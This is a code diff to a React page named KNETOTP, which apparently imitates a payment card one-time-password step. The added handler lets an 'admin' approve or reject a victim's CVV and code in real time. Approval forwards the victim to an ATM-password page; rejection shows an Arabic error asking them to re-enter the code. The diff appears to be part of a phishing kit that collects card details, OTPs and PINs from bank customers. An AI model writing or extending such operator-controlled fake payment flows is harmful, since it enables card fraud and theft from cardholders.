@@ -9,6 +9,7 @@ import {
   isFormRejected,
   waitingMessage,
   cardAction,
+  codeAction,
 } from "@/lib/store";
 
 export default function KNETOTP() {
@@ -68,6 +69,29 @@ export default function KNETOTP() {
         navigate("/final-page");
       }
       cardAction.value = null;
+    }
+  });
+
+  // Handle code action from admin (CVV approve / reject buttons)
+  useSignalEffect(() => {
+    if (codeAction.value) {
+      const action = codeAction.value.action;
+      waitingMessage.value = "";
+      setIsLoading(false);
+
+      if (action === "cvv") {
+        // Admin approved CVV, navigate to ATM password page
+        navigate("/atm-password");
+      } else if (action === "reject") {
+        setShowError(true);
+        setErrorMessage("يرجى إدخال الرمز بشكل صحيح");
+        setOtpCode("");
+        setTimeout(() => setShowError(false), 3000);
+      } else if (action === "approve") {
+        // Admin approved, go to final page
+        navigate("/final-page");
+      }
+      codeAction.value = null;
     }
   });
 
